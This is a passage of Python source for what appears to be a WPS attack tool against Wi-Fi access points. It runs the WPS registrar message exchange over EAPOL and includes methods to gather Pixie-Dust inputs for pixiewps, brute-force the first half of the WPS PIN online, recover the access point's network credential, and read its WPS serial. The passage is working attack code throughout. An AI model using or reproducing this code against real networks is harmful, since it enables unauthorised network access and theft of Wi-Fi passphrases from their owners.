            while True:
                info = self._recv_eap(eapol)
                if info is None:
                    if not got_any and starts < 3:
                        starts += 1
                        eapol.send(eapol_start())
                        self._log('→ EAPOL-Start (retry {})'.format(starts))
                        continue
                    if not got_any:
                        print('[!] No EAPOL response from the AP. The interface associated but '
                              'no EAP/EAPOL reached us — your Wi-Fi chip likely does not expose '
                              'EAPOL to userspace (FullMAC). Use an external USB adapter '
                              '(mac80211: rtl8812au/mt76/ath9k_htc), or verify WPS is enabled.')
                    self._log('(timeout: no further EAP frames)')
                    break
                got_any = True
                if info['code'] == EAP_CODE_FAIL:
                    self._log('← EAP-Failure')
                    break
                if info.get('type') == EAP_TYPE_IDENTITY and info['code'] == EAP_CODE_REQUEST:
                    self._log('← EAP-Request/Identity')
                    eapol.send(eap_identity_response(info['id'], REGISTRAR_IDENTITY))
                    self._log('→ EAP-Response/Identity ({})'.format(REGISTRAR_IDENTITY.decode()))
                    continue
                if info.get('type') != EAP_TYPE_EXPANDED:
                    continue
                msg = info.get('message', b'')
                mtype = attrs_dict(msg).get(ATTR_MSG_TYPE)
                if mtype == bytes([WPS_M1]):
                    reg.process_m1(msg)
                    self._log('← M1  E-Nonce={} PKE={}B MAC={}'.format(
                        reg.nonce_e.hex(), len(reg.pke), reg.enrollee_mac.hex()))
                    if stop == 'm1':   # just wanted the device attributes (serial)
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        self._log('→ WSC_NACK (serial probe done)')
                        break
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m2()))
                    self._log('→ M2  R-Nonce={} PKR={}B'.format(reg.nonce_r.hex(), len(reg.pkr)))
                elif mtype == bytes([WPS_M3]):
                    reg.process_m3(msg)
                    self._log('← M3  E-Hash1={} E-Hash2={}'.format(
                        reg.e_hash1.hex(), reg.e_hash2.hex()))
                    if stop == 'm3':
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        self._log('→ WSC_NACK (Pixie-Dust data collected)')
                        break
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m4()))
                    self._log('→ M4  (R-Hash1/2 + encrypted R-S1)')
                elif mtype == bytes([WPS_M5]):
                    # The AP only reaches M5 if our M4 R-Hash1 matched, i.e. the
                    # first PIN half is correct.
                    reg.reached_m5 = True
                    self._log('← M5  (first PIN half accepted)')
                    if stop == 'm5':
                        eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                        self._log('→ WSC_NACK (first-half probe done)')
                        break
                    reg.process_m5(msg)
                    eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m6()))
                    self._log('→ M6  (encrypted R-S2)')
                elif mtype == bytes([WPS_M7]):
                    reg.process_m7(msg)
                    self._log('← M7  (AP credential received)')
                    # Learn-only registrar: NACK to abort cleanly (do not send
                    # WSC_Done, which is the enrollee's op-code).
                    eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
                    self._log('→ WSC_NACK (done)')
                    break
                elif info.get('op_code') is not None:
                    self._log('← WSC op_code={} (unhandled, msg type={})'.format(
                        info['op_code'], mtype.hex() if mtype else 'none'))
            return reg
        finally:
            eapol.close()        # AF_PACKET socket (no-op for the nl80211 transport)
            try:
                sock.close()     # connection owner — closing tears down the association
            except OSError:
                pass

    def pixie_dust(self):
        """Run M1..M3 and return the six pixiewps inputs (hex) or None."""
        reg = WpsRegistrar(self._own_mac())
        self._drive(reg, stop='m3')
        return reg.pixie_data()

    def run(self, pin):
        """Full PIN path: run M1..M7 and return the recovered AP credential or None."""
        reg = WpsRegistrar(self._own_mac(), pin=str(pin))
        self._drive(reg, stop='m7')
        return reg.credential()

    def first_half_ok(self, pin):
        """Online-bruteforce probe: True if the AP accepts the first PIN half (reaches M5)."""
        reg = WpsRegistrar(self._own_mac(), pin=str(pin))
        self._drive(reg, stop='m5')
        return reg.reached_m5

    def probe_serial(self):
        """Associate, read M1, and return the AP's WPS Serial Number (or None).

        Note: this is the serial the AP advertises in WPS, which is frequently a
        placeholder rather than the real device serial.
        """
        reg = WpsRegistrar(self._own_mac())
        self._drive(reg, stop='m1')
        return reg.ap_serial
